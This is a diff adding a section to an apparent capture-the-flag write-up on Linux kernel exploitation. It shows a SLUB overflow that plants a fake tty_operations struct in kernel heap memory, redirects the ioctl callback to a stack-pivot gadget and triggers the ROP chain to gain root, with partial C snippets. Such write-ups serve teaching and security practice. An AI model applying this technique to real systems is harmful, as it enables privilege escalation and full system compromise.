@@ -200,3 +200,33 @@ write_driver((char*)payload, MAX_SIZE);
 But before sending this payload, we should think about the slub overflow a litle bit.  
 
 ## SLUB overflow  
+Soo, we know, that we want to modify the tty_opetartions pointer to be able to modify one of the callback function pointers to controll rip. But we have one problem: we cannot put this struct into any user space buffer, because SMAP prevents us to read user space addresses in kernel mode. But we can use the memo buffer again to hold this fake struct. So we need a fake tty_operations struct, and set its (for example) ioctl callback pointer to the address of the stacklift gadget.  
+```C
+struct tty_operations{
+	void *lookup;
+	void *install;
+	void *remove;
+	void *open;
+	...
+	void *ioctl;
+	...
+	void *proc_show;
+};
+```  
+```C
+...
+payload[off++] = user_ss;
+
+memcpy((char*)payload + (off * sizeof(unsigned long)), &ops, sizeof(ops));
+unsigned long offs_addr = heap + (off * sizeof(unsigned long));
+...
+((unsigned long*)distilled)[3] = offs_addr;
+...
+```  
+(Here I used the distilled buffer to work easier with the leaked heap content, basically the last byte of the memo buffer is deleted. I set the fourth address, which is the tty_ops in tty_struct to the fake struct's address.)  
+After we have written the new value back in to the kernel heap it is time to trigger the exploit. For that we need to call ioctl on the file descriptor we got when we allocated the tty_struct.  
+```C
+ioctl(ttyfd, heap, heap);
+```  
+Here I set both parameters to the heap address, which is the beginning of our rop chain, tho there was no need to set the third argument, which is just an integer, thus only the 4 lower bytes will be passed, but it is easier to see later in gdb which parameter is where. But the important part is, that in ioctl the heap address will be copied into the r12 register. Now we are done with the exploit, check it out.  
+![rooted](images/rooted.png)
